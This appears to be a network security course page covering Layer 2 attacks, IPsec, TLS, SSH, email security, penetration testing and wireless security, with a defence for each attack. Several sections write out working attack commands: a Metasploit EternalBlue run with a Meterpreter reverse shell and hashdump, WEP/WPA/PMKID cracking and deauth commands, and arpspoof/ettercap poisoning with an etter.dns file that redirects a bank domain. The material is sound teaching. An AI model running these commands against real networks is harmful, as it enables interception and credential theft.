LAN Security

Layer 2 attacks, VLAN threats, ARP/DHCP exploits, Spanning Tree weaknesses, and monitoring tools.

🔀

VLAN Hopping & Tag Stack (Double Tagging) Attack

›

What is VLAN Hopping?

VLAN hopping is a Layer 2 attack that allows an attacker on one VLAN to send/receive frames to/from another VLAN that would normally be inaccessible — bypassing inter-VLAN routing controls.

Method 1 — Switch Spoofing

The attacker configures their NIC to negotiate 802.1Q trunking with a switch (using DTP — Dynamic Trunking Protocol). Once the switch thinks it's talking to another switch, it establishes a trunk link, sending frames for ALL VLANs to the attacker.

⚠
Root Cause: DTP is enabled by default on Cisco switches. Attackers exploit auto-trunk negotiation.

Defence: Disable DTP — set all access ports to switchport mode access and explicitly configure trunk ports.

Method 2 — Double Tagging (Tag Stack Attack)

The attacker crafts a frame with two 802.1Q VLAN tags:

  • Outer tag = attacker's native VLAN (e.g. VLAN 1)
  • Inner tag = target VLAN (e.g. VLAN 20)

The first switch strips the outer tag (matches native VLAN) and forwards the frame with the inner tag intact to the next switch, which delivers it to VLAN 20. This is a one-way attack — responses cannot return.

Attacker Frame:
[Outer 802.1Q: VLAN 1][Inner 802.1Q: VLAN 20][Payload]
         ↓ Switch 1 strips outer tag
[Inner 802.1Q: VLAN 20][Payload]
         ↓ Switch 2 sends to VLAN 20 ✓
✅
Defence: Change the native VLAN from default (VLAN 1) to an unused VLAN; tag the native VLAN explicitly on all trunks.

Key Exam Points

  • VLAN hopping bypasses logical segmentation — does NOT break physical separation
  • Double tagging only works toward the victim (uni-directional)
  • Countermeasures: disable DTP, change native VLAN, use private VLANs

Broadcast Floods & Layer 2 DoS

›

Broadcast / MAC Flooding

A switch maintains a CAM table (Content Addressable Memory) mapping MAC → port. An attacker sends millions of frames with random source MACs, exhausting the CAM table. When full, the switch fails open — it floods ALL frames out ALL ports (behaves like a hub), enabling eavesdropping.

🔴
Tool used: macof (part of dsniff suite) can generate thousands of random MAC entries per second.

Broadcast Storm

A loop in the network causes broadcast frames to circulate endlessly, consuming all bandwidth. Prevented by Spanning Tree Protocol (STP). An attacker can induce storms by creating loops or by sending crafted BPDU frames to disable STP.

Countermeasures

  • Port Security: Limit the number of MAC addresses per port (e.g. max 2). Violation actions: restrict, protect, shutdown
  • Storm Control: Rate-limit broadcast/multicast/unicast traffic per port (threshold in pps or %)
  • BPDU Guard: Shutdown ports that receive unexpected BPDU frames

interface Fa0/1
 switchport mode access
 switchport port-security maximum 2
 switchport port-security violation shutdown
 switchport port-security

ARP Spoofing / ARP Poisoning

›

How ARP Works

ARP (Address Resolution Protocol, RFC 826) maps IP addresses to MAC addresses. When host A wants to reach host B, it broadcasts "Who has IP x.x.x.x? Tell A." B replies with its MAC.

⚠
ARP is stateless and unauthenticated. Any host can send a gratuitous ARP reply — no request needed.

The Attack

The attacker sends crafted ARP replies to both the victim and the gateway, poisoning both their ARP caches:

Attacker → Victim: "Gateway's MAC = AA:BB:CC:DD:EE:FF (attacker's MAC)"
Attacker → Gateway: "Victim's MAC = AA:BB:CC:DD:EE:FF (attacker's MAC)"
Result: All traffic flows through attacker (MITM)

Consequences

  • Man-in-the-Middle (MITM) — intercept/modify traffic
  • Session hijacking, credential theft
  • Denial of Service (drop intercepted packets)
  • SSL stripping when combined with sslstrip

Tools

Ettercap arpspoof (dsniff) Cain & Abel Bettercap

Defences

  • Dynamic ARP Inspection (DAI): Validates ARP packets against a DHCP snooping binding table; drops invalid ARP replies
  • Static ARP entries: For critical hosts (gateways)
  • 802.1X: Port-based authentication
  • Encryption (TLS/SSH): MITM loses value if traffic is encrypted end-to-end
📋

DHCP Attacks, Starvation & Rogue DHCP

›

DHCP Starvation (DoS)

The attacker floods the DHCP server with DISCOVER messages using random/spoofed MAC addresses, exhausting the IP address pool. Legitimate clients cannot obtain IP addresses.

Tool: Gobbler, yersinia

Rogue DHCP Server (DHCP Hijacking)

After starving the legitimate server, the attacker stands up their own DHCP server. Clients receive:

  • Attacker's machine as the default gateway → MITM all traffic
  • Attacker's machine as the DNS server → DNS hijacking

DHCP Snooping (Defence)

Switch feature that acts as a firewall between trusted (uplink) and untrusted (access) ports:

  • Trusted ports: only connected to real DHCP servers or uplinks
  • Untrusted ports: client-facing — DHCP replies from these ports are dropped
  • Builds a binding table: MAC ↔ IP ↔ VLAN ↔ Port (used by DAI and IP Source Guard)
! Enable DHCP Snooping (Cisco)
ip dhcp snooping
ip dhcp snooping vlan 10
interface Gi0/1
 ip dhcp snooping trust     ! uplink or real server port

DNS Hijacking

›

DNS Overview

DNS translates domain names (google.com) to IP addresses. It operates over UDP/TCP port 53 and is unauthenticated by default.

DNS Cache Poisoning (Kaminsky Attack)

An attacker injects forged DNS responses into a resolver's cache, redirecting users to malicious IPs without compromising the DNS server itself. The attacker races to answer a DNS query with a forged response before the legitimate server responds.

DNS Hijacking via Rogue DHCP

When DHCP assigns the attacker as the DNS server, every domain name resolution goes through the attacker who can respond with any IP — redirecting traffic to phishing sites.

Defences

  • DNSSEC: Digitally signs DNS records — validates authenticity and integrity
  • DNS over HTTPS (DoH) / DNS over TLS (DoT): Encrypts DNS queries
  • Randomise source port + query ID to make cache poisoning harder
🌳

Spanning Tree Protocol (STP) Attacks

›

STP Overview

IEEE 802.1D STP prevents Layer 2 loops by electing a Root Bridge (lowest Bridge ID = priority + MAC), then blocking redundant paths. Switches exchange BPDU (Bridge Protocol Data Units) to build the spanning tree.

Root Bridge Hijacking

An attacker connects a device and sends BPDUs with a very low priority (e.g. 0), claiming to be the root bridge. Legitimate switches re-elect the topology around the attacker — all traffic now flows through the attacker's device.

Attacker sends BPDU with Priority = 0 (lower than real root)
→ Switches accept attacker as new Root Bridge
→ STP reconverges, all traffic re-routes through attacker

STP DoS (Topology Change Attack)

Continuously sending Topology Change Notifications (TCNs) forces switches to flush their MAC tables constantly, flooding all frames and degrading performance.

Defences

  • BPDU Guard: Immediately shuts down any access port that receives a BPDU (access ports should never receive BPDUs)
  • Root Guard: Prevents a port from becoming a root port; if a superior BPDU arrives, the port is placed in root-inconsistent state
  • BPDU Filter: Suppresses sending/receiving BPDUs on a port (use carefully — can re-introduce loops)
  • PortFast: Instantly transitions access ports to forwarding state (skips STP), combined with BPDU Guard

Control Plane Policing (CoPP) & Link Layer Security

›

Control Plane Policing (CoPP)

Routers/switches have three planes: Data plane (forwarding), Control plane (routing protocols, STP, ARP — handled by CPU), and Management plane (SSH, SNMP). CoPP uses Modular QoS CLI (MQC) to rate-limit traffic destined for the control plane CPU, protecting against CPU-exhaustion attacks.

Link Layer Security — 802.1AE (MACsec)

IEEE 802.1AE MACsec provides point-to-point Layer 2 encryption between switches or between a switch and a host. It encrypts Ethernet frames hop-by-hop, preventing eavesdropping even if someone taps the cable.

  • Uses AES-GCM-128 or AES-GCM-256 encryption
  • Provides integrity, confidentiality, and replay protection at Layer 2
  • Key management via 802.1X and MKA (MACsec Key Agreement protocol)

Port Security

Port security limits which MAC addresses can communicate through a switch port, preventing MAC flooding and unauthorised device connection.

NetFlow & RMON 2

›

NetFlow

Cisco NetFlow collects IP traffic flow data from routers/switches and exports it to a NetFlow collector. A flow is defined by 5-tuple: Source IP, Destination IP, Source Port, Dest Port, Protocol.

  • Version 5: Fixed-format, IPv4 only (most common)
  • Version 9: Template-based, flexible, supports IPv6
  • IPFIX (v10): IETF standard based on NetFlow v9

Security Use: Anomaly detection (sudden traffic spikes, port scans, DDoS traffic patterns), forensic investigation, capacity planning.

RMON 2 (Remote Monitoring v2)

RMON 2 extends RMON 1 (which only monitored up to Layer 2) to Layer 3 and above (IP, application layer). RMON agents in network devices collect statistics that an SNMP-based management station can retrieve.

  • RMON 1: Ethernet statistics, traffic history, alarms, packet captures (up to Layer 2)
  • RMON 2: Network-layer (IP) and application-layer traffic analysis
  • Useful for detecting unusual protocol usage or application traffic anomalies

IP Security (IPsec)

IPsec architecture, AH, ESP, SA combinations, IKE, transport/tunnel modes, and VPNs.

📐

IPsec Overview & Security Policy

›

What is IPsec?

IPsec (Internet Protocol Security) is a suite of protocols standardised by IETF (RFC 4301–4309) that provides security services at the IP layer (Layer 3). It is transparent to applications — no application changes required.

Services Provided

  • Authentication: Verifies the identity of the communicating parties
  • Integrity: Ensures packets are not tampered with in transit (HMAC)
  • Confidentiality: Encrypts packet payloads (ESP)
  • Anti-replay: Sequence numbers prevent replay attacks
  • Access Control: Security Policy Database (SPD) determines which traffic gets IPsec treatment

Security Policy Database (SPD)

Every IPsec implementation has an SPD that maps selectors (src/dst IP, protocol, ports) to one of three actions:

  • DISCARD: Drop the traffic
  • BYPASS: Forward without IPsec processing
  • PROTECT: Apply IPsec (referenced SA specifies how)

Security Association (SA)

An SA is a one-way logical connection that defines the parameters for securing traffic: algorithm, keys, lifetime. Identified by a triple: (SPI, Destination IP, Protocol). For bidirectional communication, two SAs are needed.

  • Stored in the Security Association Database (SAD)
  • SPI (Security Parameter Index): 32-bit value in each packet header identifying the SA
🔐

AH vs ESP — Authentication & Encapsulation

›

Authentication Header (AH) — Protocol 51

AH provides authentication and integrity for the entire IP packet (including the IP header), but provides NO confidentiality (no encryption). It uses HMAC (e.g. HMAC-SHA256).

⚠
AH is incompatible with NAT because NAT changes the IP header, breaking AH's integrity check. Rarely used today.

Encapsulating Security Payload (ESP) — Protocol 50

ESP provides confidentiality (encryption), authentication, integrity, and anti-replay. It protects only the payload (not the outer IP header in tunnel mode).

ESP Packet Structure

[IP Header][ESP Header: SPI + Seq#][Encrypted: Payload + Padding + Pad Len + Next Hdr][ESP Auth Trailer: ICV]

Common Algorithms

  • Encryption: AES-CBC, AES-GCM, 3DES (legacy)
  • Integrity/Auth: HMAC-SHA256, HMAC-SHA384, AES-GMAC

Transport Mode vs Tunnel Mode

›

Transport Mode

The original IP header is preserved. IPsec headers are inserted between the IP header and the transport layer (TCP/UDP) payload. Used for host-to-host communication.

Transport Mode:
[Original IP Hdr][IPsec Header][TCP/UDP][Data]
  • Lower overhead (no extra IP header)
  • Endpoints must be the IPsec gateways (exposes real IPs)
  • Typical use: Remote host to server, L2TP/IPsec client VPN

Tunnel Mode

The entire original IP packet is encapsulated inside a new IP packet with a new outer IP header. The original packet (including its IP header) is protected. Used for gateway-to-gateway (site-to-site VPN).

Tunnel Mode:
[New IP Hdr (gateway IPs)][IPsec Header][Original IP Hdr][TCP/UDP][Data]
  • Hides the original source/destination IPs (extra privacy)
  • Supports NAT-T (NAT Traversal) with UDP port 4500
  • More overhead due to extra IP header
  • Used in site-to-site VPNs between routers/firewalls
🤝

Internet Key Exchange (IKE)

›

Purpose

IKE (defined in RFC 7296, IKEv2) automates the negotiation of SAs and management of cryptographic keys. Without IKE, all keys and parameters would need to be manually configured.

IKEv1 — Two Phases

  • Phase 1 (IKE SA): Establishes a secure, authenticated channel (ISAKMP SA) used to protect Phase 2. Two modes:
    • Main Mode: 6 messages, protects identity, more secure
    • Aggressive Mode: 3 messages, faster but exposes identity hash
  • Phase 2 (IPsec SA): Uses the IKE SA to negotiate IPsec SAs (Quick Mode, 3 messages)

IKEv2 (Modern — Preferred)

Replaces IKEv1 with a simpler, more efficient exchange (4 messages for initial setup). Supports MOBIKE (mobility), EAP authentication, and has built-in NAT traversal.

Authentication Methods

  • Pre-Shared Key (PSK): Simple but requires secure out-of-band key distribution
  • RSA Digital Signatures: Uses PKI certificates — more scalable
  • EAP (IKEv2 only): Allows username/password or other EAP methods

Key Exchange — Diffie-Hellman (DH)

IKE uses DH to establish a shared secret over an insecure channel without transmitting the secret itself. The DH group determines key strength (Group 14 = 2048-bit, Group 19 = 256-bit ECDH recommended).

IPsec VPN (Site-to-Site)

Two gateway routers/firewalls negotiate an IKE tunnel in tunnel mode with ESP. Traffic between the two sites is encrypted and encapsulated. The VPN gateway decapsulates and forwards to the internal network.

ℹ
Split tunnelling: Only traffic destined for the remote network goes through the VPN; internet traffic exits locally. Full tunnelling forces ALL traffic through the VPN.

Combining SAs (SA Bundles)

Multiple SAs can be combined in sequence, known as an SA bundle. For example, applying AH then ESP, or nesting tunnel-mode inside transport-mode for extra protection between intermediate gateways.

SSL / TLS — Secure Sockets Layer & Transport Layer Security

›

Overview

SSL was developed by Netscape in 1994. TLS is its successor (IETF standardised). Both provide a secure channel between two communicating parties at the transport layer, sitting between TCP and the application layer.

VersionStatusNotes
SSL 2.0 / 3.0Deprecated (broken)POODLE, DROWN attacks
TLS 1.0 / 1.1Deprecated (2021)BEAST, POODLE
TLS 1.2Widely usedSupports AES-GCM
TLS 1.3Current (RFC 8446)Faster handshake, forward secrecy mandatory

TLS Architecture — Sub-protocols

  • Handshake Protocol: Negotiates algorithms, authenticates server (and optionally client), establishes session keys
  • Record Protocol: Fragments, compresses, MACs, and encrypts application data
  • Alert Protocol: Communicates warnings and errors (e.g. certificate expired)
  • Change Cipher Spec: Signals switch to negotiated cipher suite (simplified/removed in TLS 1.3)

TLS 1.3 Handshake (Simplified)

Client → Server: ClientHello (supported ciphers, key_share)
Server → Client: ServerHello + Certificate + CertificateVerify + Finished
Client → Server: Finished
[Both sides derive session keys from shared secret — 1-RTT]
Application data can flow immediately.

Key Security Features

  • Certificate-based authentication: Server certificate signed by a trusted CA
  • Perfect Forward Secrecy (PFS): Ephemeral DH keys — compromise of long-term key doesn't expose past sessions
  • AEAD ciphers: TLS 1.3 mandates authenticated encryption (AES-GCM, ChaCha20-Poly1305)
🌍

HTTPS Standard

›

What is HTTPS?

HTTPS = HTTP over TLS. It encrypts the entire HTTP exchange, providing confidentiality, integrity, and server authentication. Default port: 443.

How it Works

  1. TCP connection established on port 443
  2. TLS handshake: server presents certificate, keys are exchanged
  3. HTTP requests/responses are sent encrypted inside TLS records

HSTS (HTTP Strict Transport Security)

Server sends Strict-Transport-Security header, instructing browsers to only use HTTPS for future connections, preventing SSL stripping attacks.

Certificate Validation

  • DV (Domain Validated): Proves control of domain only
  • OV (Organisation Validated): Validates organisation identity
  • EV (Extended Validation): Highest assurance — shows organisation name in browser

Attacks on HTTPS

  • SSL Stripping (sslstrip): Downgrades HTTPS to HTTP in a MITM attack
  • Certificate pinning bypass: Attacker installs custom CA to intercept TLS
  • BEAST, CRIME, BREACH: Attacks exploiting TLS implementation weaknesses
🖥️

Secure Shell (SSH)

›

Overview

SSH (RFC 4251–4254) provides a secure encrypted channel for remote login, command execution, and file transfer. Replaces insecure: Telnet (23), rsh, rlogin, FTP. Default port: 22.

SSH Architecture — Three Layers

  • Transport Layer Protocol: Server authentication, encryption, integrity, compression. Uses DH for key exchange. Provides a secure channel.
  • User Authentication Protocol: Authenticates the client to the server (password, public key, GSSAPI)
  • Connection Protocol: Multiplexes the secure channel into multiple logical channels (shell sessions, port forwarding, SFTP)

Authentication Methods

  • Password: Sent encrypted over the secure channel
  • Public Key (preferred): Client has a key pair; server stores the public key in ~/.ssh/authorized_keys; client proves possession of private key via digital signature
  • Host-based: Based on the client host's identity

SSH Features

  • Port Forwarding / Tunnelling: Forward local ports through SSH to bypass firewalls
  • SFTP/SCP: Secure file transfer over SSH
  • Jump Host (ProxyJump): Hop through an intermediate server
✅
Always disable password authentication in favour of public-key auth, disable root login, and run SSH on a non-standard port as additional hardening.
✉️

Pretty Good Privacy (PGP)

›

Overview

PGP (Phil Zimmermann, 1991) provides email encryption and digital signatures using a Web of Trust model (no central CA — users vouch for each other's keys). OpenPGP is the IETF standard (RFC 4880).

How PGP Encrypts a Message

  1. Generate a random session key (symmetric, e.g. AES-256)
  2. Encrypt the message with the session key
  3. Encrypt the session key with the recipient's RSA/ECDH public key
  4. Send both encrypted message + encrypted session key

How PGP Signs a Message

  1. Hash the message (SHA-256)
  2. Encrypt the hash with the sender's private key → digital signature
  3. Recipient verifies by decrypting the signature with the sender's public key and comparing hashes

Key Management

PGP uses key rings (public keyring and private keyring). Keys are distributed via keyservers (e.g. keys.openpgp.org). Trust levels: unknown → undefined → marginal → full → ultimate.

📨

S/MIME & DKIM

›

S/MIME (Secure/Multipurpose Internet Mail Extensions)

S/MIME (RFC 5751) adds email encryption and digital signatures using X.509 certificates (PKI-based, unlike PGP's web of trust). Widely supported in corporate email clients (Outlook, Apple Mail).

  • Encryption: Uses recipient's public key certificate to encrypt a session key → hybrid encryption
  • Digital Signature: Uses sender's private key, provides non-repudiation
  • Certificate obtained from: A trusted Certificate Authority (CA)

PGP vs S/MIME

FeaturePGP/OpenPGPS/MIME
Trust modelWeb of TrustPKI / CA hierarchy
CertificatesPGP key (self-signed ok)X.509 from CA
Use caseIndividual, technical usersCorporate environments
Key distributionKeyservers, manualCA-issued certs

DKIM (DomainKeys Identified Mail)

DKIM (RFC 6376) allows email senders to digitally sign messages using a private key. The corresponding public key is published in DNS. Receiving mail servers verify the signature, proving the email originated from the claimed domain and was not modified in transit.

  • Protects against email spoofing and tampering
  • Works alongside SPF (Sender Policy Framework) and DMARC for complete email authentication
  • The DKIM signature appears in the DKIM-Signature email header
ℹ
SPF: Lists authorised mail servers for a domain in DNS. DMARC: Policy that ties SPF and DKIM together and specifies what to do on failure (none / quarantine / reject).

Penetration Testing — Methodology & Phases

›

What is Penetration Testing?

A pen test is an authorised, simulated cyberattack on a system to evaluate its security posture. It differs from vulnerability scanning in that a pen tester actively exploits vulnerabilities to demonstrate impact.

Types of Pen Tests (by knowledge)

TypeAttacker KnowledgeSimulates
Black BoxNo prior knowledgeExternal attacker
White BoxFull access (code, architecture)Insider / code review
Grey BoxPartial knowledgeSemi-insider, partner

Pen Test Phases (PTES Methodology)

  1. Pre-engagement: Scope definition, rules of engagement, legal authorisation
  2. Intelligence Gathering (Recon): Passive (OSINT) and active information gathering
  3. Threat Modelling: Identify most valuable targets and attack vectors
  4. Vulnerability Analysis: Identify weaknesses using automated scanners + manual analysis
  5. Exploitation: Actively exploit vulnerabilities using Metasploit, custom exploits
  6. Post-Exploitation: Privilege escalation, lateral movement, persistence, data exfiltration
  7. Reporting: Executive summary + technical findings + remediation recommendations
🗡️

Metasploit Framework

›

Architecture

Metasploit is an open-source pen-testing framework (Rapid7). It provides a database of exploits, payloads, and auxiliary modules.

Key Components

  • Exploit: Code that takes advantage of a vulnerability (e.g. EternalBlue, MS17-010)
  • Payload: Code executed after exploitation (e.g. Meterpreter, shell)
  • Auxiliary: Scanners, fuzzers, sniffers (no payload needed)
  • Post-modules: Post-exploitation actions (dump hashes, screenshot, pivot)
  • Encoder: Obfuscates payload to evade AV detection
  • Nop: No-operation sled used in buffer overflow exploits

Basic Workflow

msfconsole
msf> search ms17_010
msf> use exploit/windows/smb/ms17_010_eternalblue
msf(ms17...)> set RHOSTS 192.168.1.10
msf(ms17...)> set payload windows/x64/meterpreter/reverse_tcp
msf(ms17...)> set LHOST 192.168.1.50
msf(ms17...)> run
[*] Meterpreter session 1 opened
meterpreter> sysinfo
meterpreter> hashdump

Meterpreter (Meta-Interpreter)

Advanced in-memory payload that runs entirely in RAM — leaves minimal disk footprint. Provides: shell, file upload/download, keylogging, screenshot, webcam access, pivoting.

Intelligence Gathering, Port Scanning & Vulnerability Scanning

›

Intelligence Gathering (Reconnaissance)

Passive Recon (OSINT): Gathering info without touching the target. Tools: WHOIS, DNS lookups, Google dorking (site:, filetype:, inurl:), Shodan, theHarvester, Maltego.

Active Recon: Directly probing the target (ping, port scans, banner grabbing). More likely to be detected.

Port & Network Scanning — Nmap

nmap -sV -sC -O -p- 192.168.1.1     # Full scan: version, scripts, OS
nmap -sS 192.168.1.0/24              # SYN (stealth) scan
nmap --script vuln 192.168.1.1       # Run vulnerability scripts
nmap -sU -p 53,67,161 192.168.1.1   # UDP scan

Vulnerability Scanning — Nessus & OpenVAS

Nessus (Tenable): Commercial vulnerability scanner (free for personal use — Essentials). Identifies CVEs, misconfigurations, default passwords. Outputs severity-rated reports.

OpenVAS (Greenbone): Open-source alternative to Nessus. Greenbone Vulnerability Manager (GVM) provides a web UI. Contains an extensive NVT (Network Vulnerability Tests) feed.

SPARTA (now Spartan)

Python GUI that automates recon and scanning. Integrates nmap, Nikto, Hydra, and other tools into a point-and-click interface. Useful for structured vulnerability assessment workflows.

IDS & IPS — Types & Detection Methods

›

IDS vs IPS

FeatureIDS (Intrusion Detection)IPS (Intrusion Prevention)
PositionOut-of-band (mirror/tap)Inline (traffic passes through)
ActionDetect & Alert onlyDetect, Alert & Block
Failure modeFail-open (no impact on traffic)Fail-open or fail-closed
LatencyNone (passive)Adds processing latency

1. Signature-Based Detection

Compares traffic against a database of known attack signatures (patterns). Fast and accurate for known threats, but cannot detect zero-day or unknown attacks. Requires constant signature updates.

⚠
Weakness: Attackers can modify attack to avoid matching signature (polymorphic malware).

2. Anomaly-Based Detection

Establishes a baseline of normal behaviour (traffic volume, protocol distribution, connection patterns). Any significant deviation triggers an alert. Can detect unknown/zero-day attacks but has higher false-positive rates during the learning phase.

3. Policy-Based (Specification-Based) Detection

Alerts based on violations of manually defined security policies (e.g. "no FTP from DMZ to internal network"). Very low false positives but requires extensive manual policy creation.

4. Honeypot-Based Detection

A honeypot is a decoy system designed to attract attackers. Any interaction with a honeypot is inherently suspicious (no legitimate user should access it). Provides early warning and intelligence on attacker techniques.

  • Low-interaction: Simulates services (e.g. Honeyd) — safer but less intelligence
  • High-interaction: Real OS and services — richer data but higher risk of compromise
  • Honeynet: Network of honeypots

Wireless Encryption — WEP & WPA/WPA2/WPA3

›

WEP (Wired Equivalent Privacy)

WEP (IEEE 802.11, 1997) uses RC4 stream cipher with 40-bit or 104-bit keys and a 24-bit IV (Initialisation Vector). Completely broken — crackable in minutes.

  • IV too short (24-bit): only 16 million possible values — IVs repeat frequently
  • RC4 key scheduling weakness: related-key attacks (FMS/KoreK/PTW)
  • No proper integrity protection (CRC-32 is not a MAC)

Cracking WEP

# 1. Set adapter to monitor mode
airmon-ng start wlan0

# 2. Capture packets on target network
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# 3. Accelerate IV collection with ARP replay attack
aireplay-ng -3 -b AA:BB:CC:DD:EE:FF -h 11:22:33:44:55:66 wlan0mon

# 4. Crack the key (needs ~50,000+ IVs)
aircrack-ng capture*.cap

WPA / WPA2

WPA (2003, interim fix): Uses TKIP (RC4-based, still vulnerable to some attacks). WPA2 (802.11i): Uses AES-CCMP — currently secure against brute force if strong passphrase used.

Cracking WPA/WPA2 (4-Way Handshake)

The attacker captures the 4-way authentication handshake, then performs an offline dictionary/brute-force attack against the PBKDF2-derived PMK.

# Capture handshake
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
# Deauth a client to force re-auth
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon
# Crack with wordlist
aircrack-ng capture*.cap -w /usr/share/wordlists/rockyou.txt
✅
WPA3 uses SAE (Simultaneous Authentication of Equals / Dragonfly handshake) — resistant to offline dictionary attacks and provides forward secrecy.

PMKID Attack (hashcat)

Doesn't require capturing the 4-way handshake — extracts the PMKID from a single EAPOL frame and cracks offline. More efficient than handshake capture.

hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1
hcxpcapngtool -o hashes.22000 capture.pcapng
hashcat -m 22000 hashes.22000 rockyou.txt

Evil Twin Attack & Deauthentication Attack

›

Evil Twin (Rogue AP)

The attacker creates a counterfeit access point with the same SSID (and ideally same BSSID) as a legitimate AP. Clients are tricked into connecting to the attacker's AP, enabling MITM.

  1. Scan for target AP (SSID, BSSID, channel, encryption)
  2. Create an AP with same SSID (stronger signal preferred)
  3. Use deauth attack to disconnect clients from legitimate AP
  4. Clients auto-connect to attacker's AP
  5. Attacker provides DHCP/DNS → captures credentials (captive portal, SSL strip)

Tools: Airbase-ng hostapd-wpe WiFi-Pumpkin Fern WiFi Cracker

# Create Evil Twin AP with Airbase-ng
airbase-ng -e "TargetSSID" -c 6 wlan0mon

Deauthentication (Deauth) Attack

802.11 management frames (including Deauth frames) are unauthenticated in WPA/WPA2. An attacker spoofs deauth frames from the AP to force clients to disconnect.

# Broadcast deauth (disconnect all clients from AP)
aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF wlan0mon

# Targeted deauth (specific client)
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
ℹ
IEEE 802.11w (Management Frame Protection, MFP) — encrypts and authenticates management frames, preventing deauth attacks. Mandatory in WPA3.

Network Sniffing & Wireshark Analysis

›

Network Sniffing

Capturing and analysing network traffic (packets) passing through a network interface. Requires the interface to be in promiscuous mode (captures all frames, not just those addressed to the host). For wireless, monitor mode is used.

Packet Structure (Ethernet / IP / TCP)

[Ethernet Header: Dst MAC | Src MAC | EtherType]
[IP Header: Version | IHL | DSCP | Total Length | ID | Flags | TTL | Protocol | Checksum | Src IP | Dst IP]
[TCP Header: Src Port | Dst Port | Seq# | Ack# | Flags | Window | Checksum | Urgent]
[Application Data / Payload]

Wireshark Key Features

  • Capture filters: BPF syntax — host 192.168.1.1, port 80, tcp and port 443 (applied during capture)
  • Display filters: http.request.method == "POST", dns, tcp.flags.syn==1 (applied post-capture)
  • Follow TCP Stream: Reassemble and view entire TCP conversation
  • Statistics → IO Graph: Visualise traffic over time
  • Expert Information: Highlights TCP retransmissions, errors
Common Wireshark Display Filters:
http                           → all HTTP traffic
http.request.method == "GET"   → HTTP GET requests
dns.qry.name contains "bank"   → DNS queries for "bank"
tcp.flags.syn == 1 and tcp.flags.ack == 0  → SYN packets (port scan detection)
arp.opcode == 2                → ARP replies (detect ARP spoofing)
ip.src == 192.168.1.50         → traffic from a specific IP

Packet Manipulation

Tools like Scapy (Python) allow crafting custom packets with arbitrary field values — useful for testing, fuzzing, and exploiting protocol weaknesses.

# Scapy — send custom ICMP packet
from scapy.all import *
pkt = IP(dst="192.168.1.1")/ICMP()/"Hello"
send(pkt)

Man-in-the-Middle, Ettercap, DNS & ARP Poisoning

›

Man-in-the-Middle (MITM) Attack

The attacker secretly relays (and potentially alters) communication between two parties who believe they are directly communicating with each other. Achieved by combining ARP poisoning (to redirect traffic) with IP forwarding (to relay it).

# Enable IP forwarding (Linux)
echo 1 > /proc/sys/net/ipv4/ip_forward

# ARP poison both directions
arpspoof -i eth0 -t 192.168.1.10 192.168.1.1   # tell victim gateway is attacker
arpspoof -i eth0 -t 192.168.1.1 192.168.1.10   # tell gateway victim is attacker

Ettercap

Ettercap is a comprehensive MITM framework that automates ARP poisoning, traffic interception, and provides plugins for additional attacks.

# Text-mode MITM against two specific hosts
ettercap -T -q -M arp:remote /192.168.1.1// /192.168.1.10//

# Enable DNS spoofing plugin: edit /etc/ettercap/etter.dns first
ettercap -T -q -M arp:remote -P dns_spoof /192.168.1.1// /192.168.1.10//

DNS Poisoning (DNS Spoofing)

After becoming a MITM via ARP poisoning, the attacker responds to DNS queries from the victim with forged IP addresses, redirecting the victim to malicious servers.

Ettercap's dns_spoof plugin intercepts DNS queries and responds with attacker-specified IPs based on rules in etter.dns:

# /etc/ettercap/etter.dns
*.google.com    A    192.168.1.100
www.bank.com    A    192.168.1.100

ARP Poisoning Defences (Summary)

  • Dynamic ARP Inspection (DAI) — validates ARP vs DHCP binding table
  • Static ARP entries — for critical hosts
  • XArp / ARPwatch — detect ARP anomalies
  • Encryption (TLS/SSH/HTTPS) — renders MITM traffic useless
  • VPN — encrypt traffic end-to-end at Layer 3
  • 802.1X Port Authentication — prevent unauthorised devices
